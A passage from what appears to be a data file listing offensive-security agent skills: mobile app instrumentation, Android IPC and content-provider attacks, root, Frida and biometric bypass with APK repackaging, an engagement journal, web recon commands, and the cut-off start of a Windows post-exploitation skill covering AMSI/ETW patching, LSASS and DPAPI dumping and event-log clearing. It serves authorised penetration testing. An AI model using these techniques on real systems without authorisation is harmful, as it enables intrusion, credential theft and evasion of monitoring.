&lt;cmd&gt;</code> — a shell in the app's own UID context</li></ul><p>iOS equivalents: <code>ios hooking list classes</code>, <code>ios hooking list class_methods &lt;class&gt; --include-parents</code>, <code>ios hooking watch &lt;pattern&gt; --dump-args --dump-return</code>, <code>ios hooking set return_value</code>, <code>ios info binary</code>, <code>ios bundles list_frameworks</code>.</p><p>Heap and memory:</p><ul class=\"ml\"><li><code>android heap search instances &lt;class&gt;</code> — find live objects, then <code>android heap print fields &lt;handle&gt;</code> to read their state and <code>android heap execute &lt;handle&gt; &lt;method&gt;</code> to call a method on an object that already holds initialised context</li><li><code>ios heap search instances &lt;class&gt;</code>, <code>ios heap print ivars &lt;handle&gt; --to-utf8</code></li><li><code>memory list modules</code> / <code>memory list exports &lt;module&gt;</code> — the native surface</li><li><code>memory dump all &lt;file&gt;</code>, then <code>memory search &quot;&lt;pattern&gt;&quot; --string</code> — recover values that never pass through a hookable API</li><li><code>memory write</code> and <code>memory replace</code> — patch in place; disruptive, use last</li></ul><p>Android component testing runs through drozer instead, over a forwarded port:</p><pre class=\"code\" data-lang=bash><code>adb forward tcp:31415 tcp:31415\ndrozer console connect\nrun app.package.attacksurface &lt;pkg&gt;</code></pre>","n":1946},{"t":"Proxying","h":"<p>Route the device through mitmproxy or Burp, install the CA into the user store, and set the proxy per app rather than device-wide where possible: <code>objection</code> → <code>android proxy set &lt;host&gt; &lt;port&gt;</code>. Certificate-pinning bypass is the mobile-application agent's own network step and is not restated here; where the pinning is bespoke, locate and hook it with the enumeration and watch commands above.</p>","n":394},{"t":"Boundary","h":"<p>This skill owns the toolchain and the runtime primitives. What to look for with them lives elsewhere: files and stores in <code>mobile-data-storage</code>, algorithms and keys in <code>mobile-crypto-keys</code>, exported components and WebView in <code>mobile-platform-ipc</code>, detection and repackaging in <code>mobile-resilience-bypass</code>. Once traffic is flowing to the backend, the testing is web and API work — <code>recon-methodology</code>, the <code>wstg-*</code> bundles, <code>attack-jwt</code> and <code>attack-idor-automation</code>.</p>","n":464}],"m":{"name":22,"desc":379,"body":6277,"file":6748,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":37.0},"name":{"lim":64,"pct":34.4}}}},"mobile-platform-ipc":{"slug":"mobile-platform-ipc","pillar":"operators","name":"mobile-platform-ipc","description":"Attack a mobile app through the platform's own component surface — exported activities, services, receivers and content providers, deep links and custom URL schemes, and unsafe WebView bridge settings. Reach for it when the entry point under test is another app or a URL the OS hands to the target, rather than the target's own user interface.","family":"mobile","ported":false,"source":null,"summary":"An Android app is not one process boundary but many. Every exported component is an entry point any other installed app — or any web page, through a deep link — can invoke without holding a single credential. This skill enumerates that surface, drives each entry point with attacker-controlled input, and covers the WebView, which is the bridge that turns a rendered page into native execution.","file":"acordia-operators/skills/mobile-platform-ipc/SKILL.md","used_by":["mobile-application"],"intro":"<p># Mobile Platform Interaction and IPC</p><p>An Android app is not one process boundary but many. Every exported component is an entry point any other installed app — or any web page, through a deep link — can invoke without holding a single credential. This skill enumerates that surface, drives each entry point with attacker-controlled input, and covers the WebView, which is the bridge that turns a rendered page into native execution.</p>","secs":[{"t":"Prerequisites","h":"<ul class=\"ml\"><li>The decoded manifest — see <code>mobile-instrumentation</code> for the decode, then read <code>output/AndroidManifest.xml</code></li><li>A device with the target installed, and <code>adb</code> reachable</li><li>The <code>drozer</code> agent installed and its console connected — see <code>mobile-instrumentation</code></li><li>On iOS, the <code>Info.plist</code> <code>CFBundleURLTypes</code> and <code>com.apple.developer.associated-domains</code> entitlement</li></ul>","n":357},{"t":"Enumerating the exposed surface","h":"<ul class=\"ml\"><li>The whole attack surface in one call: <code>drozer</code> → <code>run app.package.attacksurface &lt;pkg&gt;</code> — counts exported activities, services, receivers and providers</li><li>Per component type: <code>run app.activity.info -a &lt;pkg&gt;</code>, <code>run app.service.info -a &lt;pkg&gt;</code>, <code>run app.broadcast.info -a &lt;pkg&gt;</code>, <code>run app.provider.info -a &lt;pkg&gt;</code></li><li>From the manifest directly: any component with <code>android:exported=&quot;true&quot;</code>, or with an <code>&lt;intent-filter&gt;</code> and no explicit <code>exported</code> attribute on an older <code>targetSdkVersion</code></li><li>Live registration, which catches components added at runtime: <code>objection</code> → <code>android hooking list activities</code>, <code>android hooking list services</code>, <code>android hooking list receivers</code></li><li>Package-level view including permissions: <code>adb shell dumpsys package &lt;pkg&gt;</code></li></ul><p>A component protected by a <code>signature</code>-level permission is not reachable from an unrelated app. Check <code>android:permission</code> and <code>android:protectionLevel</code> before claiming exposure.</p>","n":919},{"t":"Driving components","h":"<ul class=\"ml\"><li>Launch an exported activity, the classic authentication-screen bypass: <code>adb shell am start -n &lt;pkg&gt;/&lt;pkg&gt;.TargetActivity</code></li><li>With a crafted intent, extras included: <code>drozer</code> → <code>run app.activity.start --component &lt;pkg&gt; &lt;pkg&gt;.TargetActivity --action android.intent.action.VIEW --extra string user admin</code></li><li>From inside the app's own process, which sidesteps export restrictions and shows what the component does when reached: <code>objection</code> → <code>android intent launch_activity &lt;pkg&gt;/&lt;activity&gt;</code>, <code>android intent launch_service &lt;pkg&gt;/&lt;service&gt;</code></li><li>Broadcasts and services: <code>drozer</code> → <code>run app.broadcast.send --component &lt;pkg&gt; &lt;receiver&gt; --extra string key value</code>, <code>run app.service.start --component &lt;pkg&gt; &lt;service&gt;</code></li><li>Implicit intents the app itself sends, which may carry sensitive extras to any app that registers the filter: <code>objection</code> → <code>android intent implicit_intents --dump-backtrace</code></li></ul>","n":883},{"t":"Content providers","h":"<ul class=\"ml\"><li>Enumerate reachable URIs: <code>drozer</code> → <code>run app.provider.finduri &lt;pkg&gt;</code>, and <code>run scanner.provider.finduris -a &lt;pkg&gt;</code></li><li>Read one: <code>drozer</code> → <code>run app.provider.query content://&lt;authority&gt;/&lt;path&gt; --vertical</code>, or <code>adb shell content query --uri content://&lt;authority&gt;/&lt;path&gt;</code></li><li>SQL injection in the provider's selection handling: <code>drozer</code> → <code>run scanner.provider.injection -a &lt;pkg&gt;</code>, and enumerate the schema with <code>run scanner.provider.sqltables -a &lt;pkg&gt;</code></li><li>Path traversal through a <code>FileProvider</code> or a custom <code>openFile</code> implementation: <code>drozer</code> → <code>run scanner.provider.traversal -a &lt;pkg&gt;</code></li><li>Write access where the provider grants it: <code>drozer</code> → <code>run app.provider.update</code> / <code>run app.provider.insert</code></li></ul><p>A provider that returns another user's rows is an authorisation failure on the device rather than in the API; the equivalent server-side test is <code>attack-idor-automation</code>.</p>","n":866},{"t":"Deep links and custom schemes","h":"<ul class=\"ml\"><li>Fire a link with a payload in the parameter: <code>adb shell am start -a android.intent.action.VIEW -d &quot;scheme://host/path?param=payload&quot;</code></li><li>Enumerate registered schemes and hosts from the manifest's <code>&lt;data&gt;</code> elements, including App Links with <code>android:autoVerify=&quot;true&quot;</code> — an unverified App Link can be claimed by another app</li><li>Test what the handler trusts: an identifier in the path, a token in a query parameter, a target URL that becomes a redirect or a WebView load</li><li>On iOS, drive a custom scheme from the device: <code>xcrun simctl openurl booted &quot;scheme://host/path?param=payload&quot;</code> on the simulator, or a link tapped from Notes on hardware</li><li>Where the parameter reaches a redirect or a server-side fetch, the payload construction is <code>attack-open-redirect</code> and <code>attack-ssrf</code>; the finding remains a mobile one because the entry point is the OS</li></ul>","n":841},{"t":"WebView","h":"<p>Read every <code>WebSettings</code> call site in the decompiled source, and check each against what the WebView actually loads:</p><div class=\"tw\"><table><thead><tr><th>Setting</th><th>Risk when enabled</th></tr></thead><tbody><tr><td><code>setJavaScriptEnabled(true)</code></td><td>Any injected or remote content executes script in the WebView</td></tr><tr><td><code>addJavascriptInterface(obj, &quot;name&quot;)</code></td><td>Script calls annotated native methods — with <code>setJavaScriptEnabled</code> and untrusted content, this is code execution in the app's context</td></tr><tr><td><code>setAllowFileAccess(true)</code></td><td>The WebView loads <code>file://</code> URLs; combined with a deep link that controls the URL, it reads the app sandbox</td></tr><tr><td><code>setAllowFileAccessFromFileURLs(true)</code></td><td>Script in a local file reads other local files</td></tr><tr><td><code>setAllowUniversalAccessFromFileURLs(true)</code></td><td>Script in a local file reads any origin — same-origin policy gone</td></tr><tr><td><code>setJavaScriptCanOpenWindowsAutomatically</code>, missing <code>shouldOverrideUrlLoading</code> validation</td><td>The loaded origin is attacker-controllable</td></tr></tbody></table></div><p>Confirm dynamically rather than from the code alone: <code>objection</code> → <code>android hooking watch class_method android.webkit.WebView.loadUrl --dump-args --dump-backtrace</code> shows exactly which URLs are loaded and from where. Then reach a controlled URL through a deep link and test whether the bridge is callable from it.</p>","n":1259},{"t":"Boundary","h":"<p>This skill owns the component and URL-handling surface the operating system exposes, and the WebView bridge. Data at rest inside the sandbox that a provider happens to expose is <code>mobile-data-storage</code>; the encryption over it is <code>mobile-crypto-keys</code>. Installing the drozer agent, decompiling and attaching are <code>mobile-instrumentation</code>. Detection that blocks instrumentation is <code>mobile-resilience-bypass</code>. Authorisation logic enforced by the backend, not by the component, belongs to <code>wstg-auth-session</code> and <code>attack-idor-automation</code>.</p>","n":530}],"m":{"name":19,"desc":343,"body":6261,"file":6693,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":33.5},"name":{"lim":64,"pct":29.7}}}},"mobile-resilience-bypass":{"slug":"mobile-resilience-bypass","pillar":"operators","name":"mobile-resilience-bypass","description":"Defeat a mobile app's self-protection so testing can begin — root and jailbreak detection, Frida and debugger detection, emulator checks, signature and integrity verification, and obfuscated control flow — then patch or repackage to make the bypass durable. Reach for it when the app refuses to launch, crashes on attach, or silently degrades once it decides the device is untrusted.","family":"mobile","ported":false,"source":null,"summary":"Resilience controls are not vulnerabilities in themselves; they are the obstacle between you and every other test. An app that exits on a rooted device, kills itself when Frida attaches, or refuses to run once resigned will block storage, crypto and IPC work entirely. This skill removes those checks, and then records how weak they were, because under MASVS-RESILIENCE their weakness is itself the finding.","file":"acordia-operators/skills/mobile-resilience-bypass/SKILL.md","used_by":["mobile-application"],"intro":"<p># Mobile Resilience Bypass</p><p>Resilience controls are not vulnerabilities in themselves; they are the obstacle between you and every other test. An app that exits on a rooted device, kills itself when Frida attaches, or refuses to run once resigned will block storage, crypto and IPC work entirely. This skill removes those checks, and then records how weak they were, because under MASVS-RESILIENCE their weakness is itself the finding.</p>","secs":[{"t":"Prerequisites","h":"<ul class=\"ml\"><li>The app installed on a rooted Android device or jailbroken iOS device, or a repackaged build</li><li><code>objection</code> / <code>frida</code> reachable — see <code>mobile-instrumentation</code></li><li>Decompiled output for locating the check — see <code>mobile-instrumentation</code></li></ul>","n":233},{"t":"Recognising which control fired","h":"<div class=\"tw\"><table><thead><tr><th>Symptom</th><th>Likely control</th></tr></thead><tbody><tr><td>Dialog then clean exit at launch</td><td>Root/jailbreak detection</td></tr><tr><td>Crash the instant Frida attaches, launch fine otherwise</td><td>Frida/instrumentation detection</td></tr><tr><td>Works spawned, dies when attached later</td><td>Debugger or <code>ptrace</code> self-attach check</td></tr><tr><td>Runs, but a feature silently fails</td><td>Integrity or signature check with a soft response</td></tr><tr><td>Runs on hardware, refuses on emulator</td><td>Emulator fingerprinting</td></tr><tr><td>Resigned build won't start</td><td>Signature verification, or iOS entitlement mismatch</td></tr></tbody></table></div><p>Distinguish before bypassing. Bypassing root detection when the real check was on the signature wastes the whole session.</p>","n":667},{"t":"Root and jailbreak detection","h":"<ul class=\"ml\"><li>First attempt, which covers the common libraries: <code>objection -g &lt;pkg&gt; explore</code> → <code>android root disable</code>, or <code>ios jailbreak disable</code></li><li>Run the bypass before the app finishes initialising, since most checks fire at launch: <code>objection -g &lt;pkg&gt; explore --startup-command &quot;&lt;bypass command&gt;&quot;</code></li><li>Where the check is bespoke, find it rather than guessing: <code>objection</code> → <code>android hooking search methods root</code>, <code>android hooking search methods jailbreak</code>, then <code>android hooking list class_methods &lt;class&gt;</code></li><li>Flip a boolean check without writing a script: <code>objection</code> → <code>android hooking set return_value &lt;class&gt;.&lt;method&gt; false</code></li><li>Observe the check to confirm you have the right one before flipping it: <code>objection</code> → <code>android hooking watch class_method &lt;class&gt;.&lt;method&gt; --dump-args --dump-backtrace --dump-return</code></li><li>Typical Android probes to grep for in the decompiled tree: <code>/system/bin/su</code>, <code>/system/xbin/su</code>, <code>test-keys</code> in <code>Build.TAGS</code>, <code>Runtime.getRuntime().exec(&quot;su&quot;)</code>, package names <code>com.topjohnwu.magisk</code> and <code>eu.chainfire.supersu</code>, and <code>PackageManager.getInstalledPackages</code></li><li>Typical iOS probes: <code>/Applications/Cydia.app</code>, <code>/bin/bash</code>, <code>/etc/apt</code>, a <code>fork()</code> that succeeds, and a write test outside the sandbox</li><li>Simulating rather than hiding is sometimes the faster path when the app branches on the result: <code>android root simulate</code>, <code>ios jailbreak simulate</code></li></ul>","n":1355},{"t":"Anti-debugging and instrumentation detection","h":"<ul class=\"ml\"><li>Android: <code>Debug.isDebuggerConnected()</code>, <code>android:debuggable</code> in the manifest, and <code>TracerPid</code> read from <code>/proc/self/status</code></li><li>Native: a <code>ptrace(PTRACE_TRACEME)</code> self-attach so no debugger can attach afterwards</li><li>Frida-specific: a scan of <code>/proc/self/maps</code> for <code>frida-agent</code>, a connect attempt against port 27042, and a check for the <code>re.frida.server</code> thread name</li><li>Counters: rename the Frida server binary and run it on a non-default port with <code>frida-server -l 127.0.0.1:&lt;port&gt;</code>; use Gadget embedded in a repackaged APK instead of a server; hook the detection function itself with <code>android hooking set return_value</code>; hook the native reader before it fires with a <code>frida</code> script over <code>Interceptor.attach</code> on <code>open</code>/<code>fopen</code></li><li>Force the interpreter when hooks will not bind against optimised code: <code>objection</code> → <code>android deoptimize</code></li></ul>","n":831},{"t":"Integrity, signature and tamper checks","h":"<ul class=\"ml\"><li>Where they live in the decompiled source: <code>PackageManager.getPackageInfo(..., GET_SIGNATURES)</code> and <code>GET_SIGNING_CERTIFICATES</code>, a hardcoded certificate hash compared at startup, a CRC over <code>classes.dex</code>, and Play Integrity / SafetyNet attestation calls</li><li>On iOS: a check that the embedded provisioning profile matches, and a code-signature validation over the main binary</li><li>Each is a boolean in the end. Locate it, watch it, then set its return value — the same three objection commands as above.</li><li>Attestation performed <em>server-side</em> cannot be hooked away on the device; note it as a control that held rather than forcing it</li></ul>","n":626},{"t":"Biometric-gate bypass","h":"<ul class=\"ml\"><li>A biometric prompt (Android <code>BiometricPrompt</code>, iOS <code>LocalAuthentication</code> <code>evaluatePolicy</code>) is a client-side self-protection gate, so it bypasses the same way as any other: <code>objection -g &lt;pkg&gt; explore</code> → <code>android biometrics bypass</code>, which hooks the success callback so the gate returns authenticated without a fingerprint or face.</li><li>Where the app rolls its own check, locate the callback and flip it: <code>android hooking search methods biometric</code>, then <code>android hooking set return_value &lt;class&gt;.&lt;method&gt; true</code>.</li><li>The tell that it is worth attacking: the gate protects only UI navigation. When the biometric result also unlocks a Keychain/Keystore-held key (<code>setUserAuthenticationRequired(true)</code>), hooking the callback does not release the key — note that as a control that held, and hand the key-material question to <code>mobile-crypto-keys</code>.</li></ul>","n":836},{"t":"Repackaging for a durable bypass","h":"<p>Runtime hooks last one session. When the bypass must survive a restart, patch the app.</p><pre class=\"code\" data-lang=bash><code>apktool d app.apk -o output/                    # decode to smali and resources\n# edit output/AndroidManifest.xml: android:debuggable=&quot;true&quot; on &lt;application&gt;,\n# and/or patch the detection method in output/smali/... to return false\napktool b output/ -o patched.apk                # rebuild\nzipalign -p -f 4 patched.apk aligned.apk\napksigner sign --ks debug.keystore aligned.apk  # resign; the original signature is gone\nadb install -r aligned.apk</code></pre><p>Two consequences to expect: a resigned build fails any signature check that is still live, so patch that check in the same pass; and <code>android:networkSecurityConfig</code> may need a user-CA trust anchor added for proxying to work afterwards.</p><p>An alternative that avoids resigning entirely is embedding Frida Gadget as a library in the repackaged APK, which gives you a hook point at process start without a running Frida server.</p>","n":969},{"t":"Recording the finding","h":"<p>The bypass is a means, but the ease of it is the result. Record which controls existed, which single command defeated each, how long it took, and whether any check was enforced server-side. &quot;Root detection present, defeated by <code>android root disable</code> in one command, no server-side attestation&quot; is a MASVS-RESILIENCE finding in its own right.</p>","n":341},{"t":"Boundary","h":"<p>This skill owns the self-protection controls and the patching that removes them. The instrumentation and repackaging toolchain itself is <code>mobile-instrumentation</code>. What you go on to read once the app runs is <code>mobile-data-storage</code>; the keys behind it are <code>mobile-crypto-keys</code>; the component surface is <code>mobile-platform-ipc</code>. Certificate pinning is a network control rather than a resilience one, and the traffic testing it unlocks is web and API work — the <code>wstg-*</code> bundles, <code>attack-jwt</code> and <code>attack-idor-automation</code>.</p>","n":515}],"m":{"name":24,"desc":383,"body":7108,"file":7585,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":37.4},"name":{"lim":64,"pct":37.5}}}},"operation-journal":{"slug":"operation-journal","pillar":"operators","name":"operation-journal","description":"Record intel, coverage and findings the way the whole operations pillar reads them back — the five files under .acordia/ops/, the severity and confidence scales, the evidence-quality bar, the finding-file shape, and how low-severity entries chain into one high or critical finding. Reach for it whenever an operator or specialist logs a discovery, records what was tested, or checks the journal before claiming ground is untested.","family":"operations-discipline","ported":false,"source":null,"summary":"Operators work against a flat-file journal under `.acordia/ops/`. It is the state mechanism that survives across turns and across specialist dispatches, since a specialist's context is gone once it returns. Anything not written to the journal is lost.","file":"acordia-operators/skills/operation-journal/SKILL.md","used_by":["cloud-security","cyber-operator","internal-network","mobile-application","web-application"],"intro":"<p># Operation journal</p><p>Operators work against a flat-file journal under <code>.acordia/ops/</code>. It is the state mechanism that survives across turns and across specialist dispatches, since a specialist's context is gone once it returns. Anything not written to the journal is lost.</p><p>This is prompt discipline, not an enforced scope: no harness restricts writes to these paths. The contract holds because the agent follows it.</p>","secs":[{"t":"Files","h":"<div class=\"tw\"><table><thead><tr><th>Path</th><th>Holds</th></tr></thead><tbody><tr><td><code>.acordia/ops/scope.md</code></td><td>Authorised targets, exclusions, rules of engagement</td></tr><tr><td><code>.acordia/ops/intel.md</code></td><td>Append-only intel log — one entry per discovery</td></tr><tr><td><code>.acordia/ops/coverage.md</code></td><td>Append-only coverage log — what was tested, how, and with what result</td></tr><tr><td><code>.acordia/ops/findings/&lt;slug&gt;.md</code></td><td>One confirmed finding per file</td></tr><tr><td><code>.acordia/ops/reports/&lt;name&gt;.md</code></td><td>Composed engagement reports</td></tr></tbody></table></div>","n":427},{"t":"Scales","h":"<p>Two scales, and only these two, across the whole pillar:</p><ul class=\"ml\"><li><strong>Severity</strong> — <code>critical</code> / <code>high</code> / <code>medium</code> / <code>low</code> / <code>informational</code></li><li><strong>Confidence</strong> — <code>confirmed</code> / <code>high</code> / <code>medium</code> / <code>low</code></li></ul><p>Every intel entry carries both. A finding carries a severity. Nothing unverified is presented as confirmed: label it with its confidence instead.</p>","n":337},{"t":"Logging discipline","h":"<ul class=\"ml\"><li><strong>Log intel on discovery, immediately</strong> — not batched at the end. Every endpoint, subdomain, technology, credential, injectable parameter, hidden parameter, exposed resource, IAM misconfiguration, hardcoded secret, directory object or edge, vulnerability hint, configuration or version disclosure, and authentication flow goes into <code>.acordia/ops/intel.md</code> the moment it is found.</li><li><strong>Read <code>coverage.md</code> before claiming a testing category, phase or host complete.</strong> Read <code>intel.md</code> alongside it, rather than re-deriving from memory what has already been tested and logged. Append the coverage entry after testing the area.</li><li><strong>Read <code>scope.md</code> before touching a target not touched yet</strong> — a host, domain, subnet, account, subscription, project, cluster, app or build. Never test outside the defined scope.</li><li><strong>Respect phase order.</strong> Do not skip to exploitation before reconnaissance is covered, and do not write a finding before its evidence quality is verified.</li></ul>","n":962},{"t":"Evidence quality","h":"<p>A coverage or intel entry carries three things:</p><ol class=\"ml\"><li>The request sent or the command run, verbatim.</li><li>A concrete response summary — never &quot;looked fine&quot;, never &quot;appeared secure&quot;. State what came back.</li><li>The reasoning that proves or disproves the finding.</li></ol><p>Treat roughly 100 characters as the floor for that reasoning: shorter than that is an assertion, not evidence. Redact sensitive values in captured output while keeping the output recognisable.</p>","n":448},{"t":"Finding file shape","h":"<p><code>.acordia/ops/findings/&lt;slug&gt;.md</code>, one confirmed finding per file:</p><ul class=\"ml\"><li><strong>Severity</strong> — from the scale above</li><li><strong>Title</strong></li><li><strong>Attack vector</strong> — the technique used (e.g. Kerberoasting, ESC1, IDOR via <code>user_id</code>, Redis unauthenticated write)</li><li><strong>Description</strong></li><li><strong>Evidence</strong> — request/response or command output, sensitive values redacted</li><li><strong>Impact</strong> — what this enables, and for whom</li><li><strong>Remediation</strong> — specific guidance, a concrete command or configuration change where one exists</li></ul>","n":477},{"t":"Chaining","h":"<p>Individually low-severity intel entries can combine into a high or critical finding — a leaked key plus an endpoint that accepts it, a verbose error plus an unauthenticated debug path, read access to one account plus a trust that reaches another. When two or more entries chain, the combined finding's severity is <strong>the chain's own severity</strong>, not the maximum of its parts. Note the chain explicitly in the finding you write, naming the entries it is built from.</p><hr><p>Per-agent additions to a journal entry — a specialist's own fields, and whether that specialist composes a report or leaves it to the orchestrator — live in that agent's prompt. This skill is the shared contract those additions extend, not a complete list of the fields any one agent writes.</p>","n":760}],"m":{"name":17,"desc":430,"body":3941,"file":4473,"dband":"over","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":42.0},"name":{"lim":64,"pct":26.6}}}},"recon-methodology":{"slug":"recon-methodology","pillar":"operators","name":"recon-methodology","description":"Build the target's asset inventory before anything is touched — passive subdomain collection from certificate transparency and archived URLs, then active DNS, resolution, port scanning, service and technology fingerprinting, with screenshots to triage what is live. Reach for it at the opening of an engagement, ahead of any intrusive testing.","family":"web-methodology","ported":true,"source":".cyberstrike/skill/recon-methodology/SKILL.md","summary":"```bash","file":"acordia-operators/skills/recon-methodology/SKILL.md","used_by":[],"intro":"<p># Reconnaissance Methodology</p>","secs":[{"t":"Phase 1: Passive Reconnaissance","h":"<h4 class=\"mh\">Subdomain Enumeration (Passive)</h4><pre class=\"code\" data-lang=bash><code># Certificate Transparency\ncurl -s &quot;https://crt.sh/?q=%25.target.com&amp;output=json&quot; | jq -r '.[].name_value' | sort -u\n\n# SecurityTrails\ncurl -s &quot;https://api.securitytrails.com/v1/domain/target.com/subdomains&quot; \\\n  -H &quot;APIKEY: $API_KEY&quot;\n\n# Subfinder (passive)\nsubfinder -d target.com -silent\n\n# Amass (passive)\namass enum -passive -d target.com\n\n# Combined approach\nsubfinder -d target.com -silent | anew subs.txt\namass enum -passive -d target.com | anew subs.txt</code></pre><h4 class=\"mh\">Historical Data</h4><pre class=\"code\" data-lang=bash><code># Wayback Machine URLs\necho &quot;target.com&quot; | waybackurls | tee wayback.txt\n\n# GAU (GetAllURLs)\necho &quot;target.com&quot; | gau --threads 5 | tee gau.txt\n\n# Combined historical\ncat wayback.txt gau.txt | sort -u | tee historical_urls.txt\n\n# Find parameters\ncat historical_urls.txt | grep &quot;=&quot; | qsreplace &quot;FUZZ&quot; | sort -u</code></pre><h4 class=\"mh\">Technology Detection</h4><pre class=\"code\" data-lang=bash><code># Wappalyzer CLI\nwappalyzer https://target.com\n\n# WhatWeb\nwhatweb -a 3 https://target.com\n\n# BuiltWith API\ncurl &quot;https://api.builtwith.com/v19/api.json?KEY=$KEY&amp;LOOKUP=target.com&quot;</code></pre>","n":1071},{"t":"Phase 2: Active Reconnaissance","h":"<h4 class=\"mh\">DNS Enumeration</h4><pre class=\"code\" data-lang=bash><code># DNS records\ndig target.com ANY +noall +answer\ndig target.com MX +short\ndig target.com TXT +short\ndig target.com NS +short\n\n# Zone transfer attempt\ndig axfr @ns1.target.com target.com\n\n# DNSRecon\ndnsrecon -d target.com -t std\n\n# Subdomain brute force\npuredns bruteforce wordlist.txt target.com -r resolvers.txt</code></pre><h4 class=\"mh\">Subdomain Resolution</h4><pre class=\"code\" data-lang=bash><code># Resolve discovered subdomains\ncat subs.txt | dnsx -silent -a -resp | tee resolved.txt\n\n# Filter live hosts\ncat resolved.txt | httpx -silent -title -status-code -tech-detect | tee live_hosts.txt\n\n# Screenshot\ncat live_hosts.txt | cut -d' ' -f1 | gowitness file -f - --threads 10</code></pre><h4 class=\"mh\">Port Scanning</h4><pre class=\"code\" data-lang=bash><code># Fast scan (top 100)\nnmap -F -sV target.com\n\n# Full TCP scan\nnmap -p- -T4 --min-rate 1000 target.com\n\n# UDP scan (top 20)\nnmap -sU --top-ports 20 target.com\n\n# Service version detection\nnmap -sV -sC -p 80,443,8080 target.com\n\n# Masscan (fast)\nmasscan -p1-65535 --rate 10000 -oJ scan.json target.com</code></pre>","n":995},{"t":"Phase 3: Content Discovery","h":"<h4 class=\"mh\">Directory Fuzzing</h4><pre class=\"code\" data-lang=bash><code># Feroxbuster\nferoxbuster -u https://target.com -w /path/to/wordlist.txt -x php,asp,html\n\n# FFUF\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403\n\n# Dirsearch\ndirsearch -u https://target.com -e php,asp,html -t 50\n\n# Gobuster\ngobuster dir -u https://target.com -w wordlist.txt -x php,html -t 50</code></pre><h4 class=\"mh\">Parameter Discovery</h4><pre class=\"code\" data-lang=bash><code># Arjun\narjun -u https://target.com/page\n\n# ParamSpider\npython3 paramspider.py -d target.com\n\n# FFUF parameter fuzzing\nffuf -u &quot;https://target.com/page?FUZZ=value&quot; -w params.txt -mc 200</code></pre><h4 class=\"mh\">JavaScript Analysis</h4><pre class=\"code\" data-lang=bash><code># Extract JS files\ncat live_hosts.txt | getJS --complete | tee js_files.txt\n\n# Find endpoints in JS\ncat js_files.txt | xargs -I{} sh -c 'curl -s {} | linkfinder -i -'\n\n# Find secrets in JS\ncat js_files.txt | xargs -I{} sh -c 'curl -s {} | secretfinder -i -'\n\n# Nuclei JS analysis\nnuclei -l js_files.txt -t exposures/</code></pre>","n":926},{"t":"Phase 4: Vulnerability Discovery","h":"<h4 class=\"mh\">Automated Scanning</h4><pre class=\"code\" data-lang=bash><code># Nuclei (comprehensive)\nnuclei -l live_hosts.txt -t nuclei-templates/ -o nuclei_results.txt\n\n# Nikto\nnikto -h https://target.com -output nikto.txt\n\n# WPScan (WordPress)\nwpscan --url https://target.com --enumerate u,p,t</code></pre><h4 class=\"mh\">Manual Testing Points</h4><pre class=\"code\"><code>1. Authentication\n   - Login forms\n   - Password reset\n   - Registration\n   - Session management\n\n2. Authorization\n   - IDOR on IDs\n   - Horizontal privilege escalation\n   - Vertical privilege escalation\n\n3. Input Validation\n   - All parameters (GET, POST)\n   - Headers (Host, Referer, User-Agent)\n   - Cookies\n   - File uploads\n\n4. Business Logic\n   - Price manipulation\n   - Quantity tampering\n   - Skip steps\n   - Race conditions</code></pre>","n":724},{"t":"Reconnaissance Flow","h":"<pre class=\"code\"><code>Target Domain\n     │\n     ├── Passive Subdomain Enumeration\n     │   ├── crt.sh, SecurityTrails\n     │   ├── Subfinder, Amass (passive)\n     │   └── Historical data (wayback, gau)\n     │\n     ├── DNS Enumeration\n     │   ├── Record types (A, MX, TXT, NS)\n     │   └── Zone transfer attempt\n     │\n     ├── Active Subdomain Enumeration\n     │   └── Brute force (puredns)\n     │\n     ├── Resolution &amp; Probing\n     │   ├── dnsx (resolve)\n     │   └── httpx (probe)\n     │\n     ├── Port Scanning\n     │   └── nmap / masscan\n     │\n     ├── Content Discovery\n     │   ├── Directory fuzzing\n     │   ├── Parameter discovery\n     │   └── JavaScript analysis\n     │\n     └── Vulnerability Scanning\n         ├── Nuclei\n         └── Manual testing</code></pre>","n":745},{"t":"Wordlists","h":"<div class=\"tw\"><table><thead><tr><th>Purpose</th><th>Recommended Wordlist</th></tr></thead><tbody><tr><td>Subdomains</td><td>SecLists/Discovery/DNS/subdomains-top1million-5000.txt</td></tr><tr><td>Directories</td><td>SecLists/Discovery/Web-Content/raft-medium-directories.txt</td></tr><tr><td>Files</td><td>SecLists/Discovery/Web-Content/raft-medium-files.txt</td></tr><tr><td>Parameters</td><td>SecLists/Discovery/Web-Content/burp-parameter-names.txt</td></tr><tr><td>Passwords</td><td>SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt</td></tr></tbody></table></div>","n":664}],"m":{"name":17,"desc":343,"body":5343,"file":5877,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":33.5},"name":{"lim":64,"pct":26.6}}}},"windows-postexploit":{"slug":"windows-postexploit","pillar":"operators","name":"windows-postexploit","description":"Work a Windows host you already administer — patch AMSI and ETW out of the way first, dump LSASS, the SAM and SYSTEM hives and DPAPI-protected secrets, watch the session, then clear event logs and scheduled-task artefacts before leaving. Reach for it once Administrator or SYSTEM is held on a Windows machine.","family":"host-postexploit","ported":true,"source":".cyberstrike/skill/windows-postexploit/SKILL.md","summary":"Windows post-exploitation uses userland APIs (no kernel driver signing needed) for credential harvesting, monitoring, and stealth. After gaining Administrator access on a Windows target, these tools provide comprehensive credential extraction and operational security capabilities.","file":"acordia-operators/skills/windows-postexploit/SKILL.md","used_by":["internal-network"],"intro":"<p># Windows Post-Exploitation Methodology</p><p>Windows post-exploitation uses userland APIs (no kernel driver signing needed) for credential harvesting, monitoring, and stealth. After gaining Administrator access on a Windows target, these tools provide comprehensive credential extraction and operational security capabilities.</p>","secs":[{"t":"Prerequisites","h":"<p>Before beginning Windows post-exploitation, verify:</p><ol class=\"ml\"><li><strong>Administrator access</strong> — most operations require elevated privileges</li><li><strong>OS version</strong> — Windows 10/11 or Server 2016+ for ETW features</li><li><strong>PowerShell</strong> — available natively on all modern Windows</li><li><strong>Python3</strong> — required for ctypes-based tools (ETW, keylogging, DPAPI, clipboard)</li><li><strong>AV/EDR status</strong> — run <code>amsi_bypass</code> and <code>etw_blind</code> first if Defender/EDR is active</li></ol><pre class=\"code\" data-lang=powershell><code># Quick prerequisite check\nwhoami /priv                              # verify SeDebugPrivilege\nGet-MpComputerStatus | 